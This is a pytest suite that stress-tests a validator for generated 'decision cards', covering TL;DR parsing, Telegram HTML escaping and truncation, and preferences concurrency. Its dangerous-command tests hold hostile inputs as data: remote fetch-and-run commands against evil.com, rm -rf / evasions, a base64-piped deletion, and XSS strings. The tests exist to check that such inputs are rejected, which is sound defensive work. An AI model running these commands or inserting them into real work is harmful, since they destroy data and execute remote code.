"""tests/test_challenger_cards.py
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Adversarial Stress Harness & Empirical Challenge Suite for Milestone 3:
1. Complex technical strings in TL;DR (multiple version numbers, dots in filenames, math expressions, URLs).
2. Evasion of dangerous command check (disguised rm -rf, sh -c "$(curl...)", chained commands, base64, python runners).
3. Malformed Unicode, emojis, unbalanced quotes, and backtick variations in quickstart commands.
4. Telegram HTML parser exploit vectors: script/img tags, unclosed tags on truncation, entity splitting, length bounds.
5. Concurrency & atomic preferences file synchronization under high feedback load, and exemplar deduplication.
"""

from __future__ import annotations

import asyncio
import html
from html.parser import HTMLParser
import json
import os
from pathlib import Path
import re
from typing import Any

import pytest

from newsscout.config import Settings
from newsscout.filtering.card_gen import (
    CardValidationError,
    DecisionCardGenerator,
    DecisionCardValidator,
    ValidationResult,
)
from newsscout.storage.db import Database
from newsscout.storage.models import (
    Breakthrough,
    DecisionCard,
    DecisionCardData,
    FeedbackRating,
    RawItem,
    Stage2Category,
)
from newsscout.storage.preferences import PreferencesService


# ============================================================================
# Telegram HTML Strict Parser & Tag Balancer Oracle
# ============================================================================

class TelegramHTMLValidator(HTMLParser):
    """Oracle enforcing Telegram Bot API HTML formatting rules:
    - Supported tags only: b, strong, i, em, u, ins, s, strike, del, span, tg-spoiler, a, code, pre, blockquote.
    - Tags must be properly nested and balanced (every start tag must have a matching end tag).
    - No unescaped '<', '>', or '&'.
    """
    ALLOWED_TAGS = {
        "b", "strong", "i", "em", "u", "ins", "s", "strike", "del",
        "span", "tg-spoiler", "a", "code", "pre", "blockquote"
    }

    def __init__(self) -> None:
        super().__init__()
        self.tag_stack: list[str] = []
        self.errors: list[str] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        tag_lower = tag.lower()
        if tag_lower not in self.ALLOWED_TAGS:
            self.errors.append(f"Disallowed HTML tag: <{tag}>")
        self.tag_stack.append(tag_lower)

    def handle_endtag(self, tag: str) -> None:
        tag_lower = tag.lower()
        if not self.tag_stack:
            self.errors.append(f"Unmatched closing tag: </{tag}> with empty stack")
            return
        expected = self.tag_stack.pop()
        if expected != tag_lower:
            self.errors.append(f"Mismatched closing tag: expected </{expected}>, got </{tag}>")

    def validate(self, html_text: str) -> list[str]:
        self.tag_stack.clear()
        self.errors.clear()
        try:
            self.feed(html_text)
            self.close()
        except Exception as exc:
            self.errors.append(f"HTML parsing exception: {exc}")
        if self.tag_stack:
            self.errors.append(f"Unclosed HTML start tags: {self.tag_stack}")
        return list(self.errors)


# ============================================================================
# Category 1: Complex Technical Strings in TL;DR
# ============================================================================

class TestChallengerTLDRComplexStrings:
    """Stress tests complex technical tokens, dots in filenames, abbreviations, math, and URLs."""

    def test_math_expressions_and_urls_accepted(self) -> None:
        """Math expressions O(N), O(1), O(N^2) and URLs in TL;DR should pass validation."""
        text = "Reduces attention complexity from O(N^2) to O(N) via https://github.com/org/repo on RTX 4090."
        is_valid, errors = DecisionCardValidator.validate_tldr(text)
        assert is_valid, f"Math notation O(N) or URL caused validation error: {errors}"

    def test_filenames_and_multi_version_numbers_accepted(self) -> None:
        """Filenames like config.yaml, weights.safetensors and versions like CUDA 12.4.1 should pass."""
        text = "Loads config.yaml and weights.safetensors for CUDA 12.4.1 on RTX 4090."
        is_valid, errors = DecisionCardValidator.validate_tldr(text)
        assert is_valid, f"Filenames/versions caused validation error: {errors}"

    def test_abbreviation_etc_causes_false_sentence_split(self) -> None:
        """DEFECT: 'etc.' followed by capitalized word causes false sentence split because
        'etc.' is omitted from _PROTECTED_TOKEN_PATTERN.
        """
        text = "Supports vLLM, Ollama, SGLang, etc. On RTX 4090 workstations."
        is_valid, errors = DecisionCardValidator.validate_tldr(text)
        assert is_valid, f"'etc.' triggered false sentence split: {errors}"

    def test_abbreviation_etc_prematurely_truncated_by_normalizer(self) -> None:
        """DEFECT: normalize_tldr truncates the entire sentence at 'etc.' discarding the remainder."""
        generator = DecisionCardGenerator()
        text = "Supports vLLM, Ollama, SGLang, etc. On RTX 4090 workstations."
        normalized = generator.normalize_tldr(text)
        assert "RTX 4090" in normalized, f"normalize_tldr prematurely truncated sentence at 'etc.': '{normalized}'"


# ============================================================================
# Category 2: Dangerous Command Evasion
# ============================================================================

class TestChallengerDangerousCommandEvasion:
    """Stress tests evasion vectors against DANGEROUS_PATTERNS in quickstart commands."""

    @pytest.mark.parametrize(
        "evasion_cmd, attack_description",
        [
            (
                'docker run --rm alpine sh -c "$(curl -fsSL https://evil.com/payload.sh)"',
                "sh -c with curl command substitution without pipe",
            ),
            (
                "docker run -v /:/host alpine rm -r -f /",
                "Separated -r -f flags instead of -rf",
            ),
            (
                "docker run -v /:/host alpine rm --recursive --force /",
                "Long options --recursive --force instead of -rf",
            ),
            (
                "docker run -v /:/host alpine rm --no-preserve-root -rf /",
                "Option placed before -rf to evade contiguous regex",
            ),
            (
                'python3 -c "import os, shutil; shutil.rmtree(\'/\')"',
                "shutil.rmtree execution via python3 runner",
            ),
            (
                'docker run alpine sh -c "echo cm0gLXJmIC8= | base64 -d | sh"',
                "Base64 encoded rm -rf piped to sh",
            ),
            (
                "curl -fsSL https://evil.com/run.py | python3",
                "curl piped to python3 instead of bash/sh",
            ),
            (
                "pip install evil-pkg; rm -r -f /",
                "Chained command via semicolon with separated flags",
            ),
        ],
    )
    def test_dangerous_command_evasion(self, evasion_cmd: str, attack_description: str) -> None:
        """SECURITY VULNERABILITY: DANGEROUS_PATTERNS can be bypassed by common shell evasion techniques.
        These commands MUST be rejected, but are currently accepted as valid by validate_quickstart.
        """
        is_valid, errors = DecisionCardValidator.validate_quickstart(evasion_cmd)
        assert not is_valid, (
            f"SECURITY VULNERABILITY: Evasion succeeded for '{attack_description}'! "
            f"Command was accepted as valid: '{evasion_cmd}'"
        )
        assert any("dangerous" in err for err in errors)


# ============================================================================
# Category 3: Malformed Unicode, Emojis, Quotes & Backticks
# ============================================================================

class TestChallengerQuotesAndFormatting:
    """Stress tests quote counting, backticks variations, and Unicode in quickstart."""

    def test_apostrophe_inside_double_quotes_falsely_rejected(self) -> None:
        """DEFECT: A single quote / apostrophe inside double quotes triggers false unbalanced quotes error."""
        cmd = 'docker run -e PROMPT="Don\'t stop" vllm/vllm-openai:latest'
        is_valid, errors = DecisionCardValidator.validate_quickstart(cmd)
        assert is_valid, f"Apostrophe inside double-quoted string was falsely rejected: {errors}"

    def test_unbalanced_backticks_accepted(self) -> None:
        """DEFECT: Unbalanced backticks within command string are not checked or rejected."""
        cmd = "docker run -e TAG=`git rev-parse HEAD vllm/vllm"
        is_valid, errors = DecisionCardValidator.validate_quickstart(cmd)
        assert not is_valid, f"Command with unbalanced backtick was incorrectly accepted: {cmd}"

    def test_console_and_shell_code_fences_in_normalizer(self) -> None:
        """DEFECT: Markdown fences with console or shell tags leave language identifier in command."""
        generator = DecisionCardGenerator()
        cmd_console = "```console\ndocker run -p 8000:8000 vllm/vllm-openai:latest\n```"
        normalized_console = generator.normalize_quickstart(cmd_console)
        assert normalized_console == "docker run -p 8000:8000 vllm/vllm-openai:latest"

        cmd_shell = "```shell\ndocker run -p 8000:8000 vllm/vllm-openai:latest\n```"
        normalized_shell = generator.normalize_quickstart(cmd_shell)
        assert normalized_shell == "docker run -p 8000:8000 vllm/vllm-openai:latest"

    def test_smart_quotes_accepted_without_conversion(self) -> None:
        """DEFECT: Unicode smart quotes (curly quotes) cause shell syntax errors but are accepted."""
        cmd = "docker run -e MODEL=“meta-llama/Llama-3” vllm/vllm"
        is_valid, errors = DecisionCardValidator.validate_quickstart(cmd)
        # Curly quotes are not valid shell quote delimiters
        assert not is_valid, f"Command with curly quotes was accepted without rejection: {cmd}"

    def test_valid_unicode_emojis_accepted(self) -> None:
        """Emojis inside valid quoted strings should pass validation."""
        cmd = 'docker run -e BOT_NAME="🚀 Scout" vllm/vllm-openai:latest'
        is_valid, errors = DecisionCardValidator.validate_quickstart(cmd)
        assert is_valid, f"Valid emoji inside quotes was rejected: {errors}"


# ============================================================================
# Category 4: Telegram HTML Parser Exploit Vectors & Truncation
# ============================================================================

class TestChallengerTelegramHTMLVectors:
    """Stress tests Telegram HTML rendering against XSS, unclosed tags, and length bounds."""

    @pytest.fixture
    def base_card(self) -> DecisionCard:
        data = DecisionCardData(
            tldr="Accelerates local inference by 3.5x using NVFP4 kernels on RTX 4090.",
            use_case="Local agent execution with 70B models on 24GB VRAM.",
            comparison="3x lower latency compared to standard FP16 vLLM baseline.",
            quickstart="docker run --gpus all -p 8000:8000 vllm/vllm-openai:latest",
            hardware_requirements="24GB VRAM (RTX 4090)",
            license="Apache 2.0",
        )
        return DecisionCard(
            breakthrough_id=1,
            title="vLLM Acceleration",
            repo_url="https://github.com/vllm-project/vllm",
            breakthrough_score=9.0,
            roi_score=9.0,
            category=Stage2Category.CORE,
            data=data,
        )

    def test_script_and_img_tags_escaped(self, base_card: DecisionCard) -> None:
        """Verifies script, iframe, img, style tags are neutralized via html.escape."""
        generator = DecisionCardGenerator()
        base_card.title = "<script>alert('xss')</script>"
        base_card.data.use_case = "<img src=x onerror=alert(1)> in <iframe>payload</iframe>"
        base_card.data.comparison = "<style>body{display:none}</style> vs baseline"
        rendered = generator.render_telegram_html(base_card)

        validator = TelegramHTMLValidator()
        errors = validator.validate(rendered)
        assert errors == [], f"Forbidden tags leaked into Telegram HTML: {errors}"
        assert "<script>" not in rendered
        assert "<img" not in rendered
        assert "<iframe>" not in rendered
        assert "<style>" not in rendered

    def test_truncation_leaves_unclosed_code_tag(self, base_card: DecisionCard) -> None:
        """CRITICAL VULNERABILITY: When render_telegram_html truncates at max_chars,
        slicing inside <code>...</code> leaves an unclosed <code> tag, causing Telegram Bot API
        to reject the message with HTTP 400 Bad Request: can't parse entities.
        """
        generator = DecisionCardGenerator()
        # Calibrate use_case length (3500 chars) so the cutoff (4066 chars) falls right inside <code>...</code>
        base_card.data.use_case = "A" * 3500
        base_card.data.quickstart = "docker run -e FOO=BAR myimage:latest " + ("X" * 500)
        rendered = generator.render_telegram_html(base_card, max_chars=4096)

        assert len(rendered) <= 4096
        validator = TelegramHTMLValidator()
        errors = validator.validate(rendered)
        assert errors == [], (
            f"CRITICAL VULNERABILITY: Telegram HTML truncation broke HTML tags! "
            f"Errors: {errors}\nTail: {rendered[-120:]}"
        )

    def test_models_render_telegram_html_lacks_length_bound(self, base_card: DecisionCard) -> None:
        """DEFECT: DecisionCard.render_telegram_html() in newsscout/storage/models.py
        has no length bounding at all and can exceed Telegram's 4096 character limit.
        """
        base_card.data.use_case = "Testing long text on RTX 4090. " * 200
        # Call models.py method directly
        rendered = base_card.render_telegram_html()
        assert len(rendered) <= 4096, (
            f"DEFECT: DecisionCard.render_telegram_html() generated {len(rendered)} chars, "
            f"exceeding Telegram's 4096 character limit!"
        )


# ============================================================================
# Category 5: Concurrency & Preferences Synchronization
# ============================================================================

class TestChallengerPreferencesConcurrencyAndDeduplication:
    """Stress tests PreferencesService under high concurrent feedback bursts and exemplar deduplication."""

    @pytest.mark.asyncio
    async def test_high_concurrency_feedback_and_readers(
        self,
        migrated_db: Database,
        tmp_path: Path,
    ) -> None:
        """Stress test: 40 concurrent feedback recordings and concurrent readers.
        Must not corrupt preferences.json, raise PermissionError, or deadlock.
        """
        prefs_file = tmp_path / "data" / "preferences.json"
        settings = Settings(
            database_path=migrated_db.db_path,
            preferences_file=prefs_file,
            gemini_api_key="test_mock_key",
        )
        service = PreferencesService(migrated_db, settings)

        # Pre-populate 5 raw_items and 5 breakthroughs
        for i in range(1, 6):
            raw = RawItem(
                id=i,
                source="github_releases",
                source_id=f"repo-{i}:v1.0",
                title=f"Breakthrough #{i}",
                url=f"https://github.com/org/repo-{i}",
                raw_content="Content",
            )
            await migrated_db.execute(
                """
                INSERT INTO raw_items (id, source, source_id, title, url, raw_content, metadata_json, ingested_at)
                VALUES (:id, :source, :source_id, :title, :url, :raw_content, :metadata_json, :ingested_at);
                """,
                {"id": i, **raw.to_db_params()},
            )
            bt = Breakthrough(
                id=i,
                raw_item_id=i,
                title=f"Breakthrough #{i}",
                repo_url=f"https://github.com/org/repo-{i}",
                breakthrough_score=9.0,
                roi_score=8.5,
                category=Stage2Category.CORE,
                tldr=f"Enables feature #{i} on RTX 4090.",
                use_case=f"Workflow #{i} with local agents on 24GB VRAM.",
                comparison="2x faster than baseline.",
                quickstart=f"docker run repo-{i}:latest",
                hardware_requirements="24GB VRAM (RTX 4090)",
                license="Apache 2.0",
                card_markdown=f"### Breakthrough #{i}",
            )
            await migrated_db.execute(
                """
                INSERT INTO breakthroughs (id, raw_item_id, title, repo_url, breakthrough_score, roi_score,
                    category, tldr, use_case, comparison, quickstart, hardware_requirements, license,
                    card_markdown, evaluation_raw_json, is_watchlisted, evaluated_at)
                VALUES (:id, :raw_item_id, :title, :repo_url, :breakthrough_score, :roi_score,
                    :category, :tldr, :use_case, :comparison, :quickstart, :hardware_requirements, :license,
                    :card_markdown, :evaluation_raw_json, :is_watchlisted, :evaluated_at);
                """,
                {"id": i, **bt.to_db_params()},
            )

        ratings = [FeedbackRating.HIT, FeedbackRating.HYPE, FeedbackRating.INSPIRE, FeedbackRating.KNOWN]

        async def record_worker(worker_id: int) -> None:
            bt_id = (worker_id % 5) + 1
            rating = ratings[worker_id % len(ratings)]
            user_id = 1000 + worker_id
            await service.record_feedback(
                breakthrough_id=bt_id,
                rating=rating,
                telegram_user_id=user_id,
                notes=f"Feedback from worker {worker_id}",
            )

        async def read_worker() -> None:
            for _ in range(5):
                await asyncio.sleep(0.01)
                try:
                    data = await service.load_preferences_from_json()
                    assert "stats" in data
                    assert "exemplars" in data
                except FileNotFoundError:
                    pass

        # Run 40 feedback writers and 5 background readers concurrently
        tasks = [record_worker(i) for i in range(40)]
        reader_tasks = [read_worker() for _ in range(5)]
        await asyncio.gather(*tasks, *reader_tasks)

        # Final verification: preferences.json must exist and be valid JSON
        assert prefs_file.exists()
        final_data = json.loads(prefs_file.read_text(encoding="utf-8"))
        assert final_data["stats"]["total_ratings"] == 40

    @pytest.mark.asyncio
    async def test_exemplars_lack_deduplication_under_multiple_ratings(
        self,
        migrated_db: Database,
        tmp_path: Path,
    ) -> None:
        """DEFECT: When the same breakthrough receives multiple feedbacks from different users,
        duplicate breakthroughs are returned in get_few_shot_exemplars, wasting prompt slots.
        """
        prefs_file = tmp_path / "data" / "preferences.json"
        settings = Settings(
            database_path=migrated_db.db_path,
            preferences_file=prefs_file,
            gemini_api_key="test_mock_key",
        )
        service = PreferencesService(migrated_db, settings)

        # Insert 1 raw item and 1 breakthrough
        raw = RawItem(
            id=1,
            source="github_releases",
            source_id="repo-1:v1.0",
            title="vLLM Breakthrough",
            url="https://github.com/vllm/vllm",
            raw_content="Content",
        )
        await migrated_db.execute(
            """
            INSERT INTO raw_items (id, source, source_id, title, url, raw_content, metadata_json, ingested_at)
            VALUES (1, :source, :source_id, :title, :url, :raw_content, :metadata_json, :ingested_at);
            """,
            {"id": 1, **raw.to_db_params()},
        )

        bt = Breakthrough(
            id=1,
            raw_item_id=1,
            title="vLLM Breakthrough",
            repo_url="https://github.com/vllm/vllm",
            breakthrough_score=9.5,
            roi_score=9.0,
            category=Stage2Category.CORE,
            tldr="Enables fast inference on RTX 4090.",
            use_case="Local agents on 24GB VRAM.",
            comparison="2x faster than baseline.",
            quickstart="docker run vllm:latest",
            hardware_requirements="24GB VRAM (RTX 4090)",
            license="Apache 2.0",
            card_markdown="### vLLM",
        )
        await migrated_db.execute(
            """
            INSERT INTO breakthroughs (id, raw_item_id, title, repo_url, breakthrough_score, roi_score,
                category, tldr, use_case, comparison, quickstart, hardware_requirements, license,
                card_markdown, evaluation_raw_json, is_watchlisted, evaluated_at)
            VALUES (1, :raw_item_id, :title, :repo_url, :breakthrough_score, :roi_score,
                :category, :tldr, :use_case, :comparison, :quickstart, :hardware_requirements, :license,
                :card_markdown, :evaluation_raw_json, :is_watchlisted, :evaluated_at);
            """,
            {"id": 1, **bt.to_db_params()},
        )

        # 3 different users rate the same breakthrough HIT
        await service.record_feedback(breakthrough_id=1, rating=FeedbackRating.HIT, telegram_user_id=101)
        await service.record_feedback(breakthrough_id=1, rating=FeedbackRating.HIT, telegram_user_id=102)
        await service.record_feedback(breakthrough_id=1, rating=FeedbackRating.HIT, telegram_user_id=103)

        exemplar_pair = await service.get_few_shot_exemplars(count=5)
        # Should NOT contain 3 duplicates of the exact same breakthrough!
        titles = [ex.title for ex in exemplar_pair.positive if ex.breakthrough_id == 1]
        assert len(titles) == 1, (
            f"DEFECT: Exemplars contain duplicate entries for the same breakthrough! "
            f"Got {len(titles)} copies: {titles}"
        )
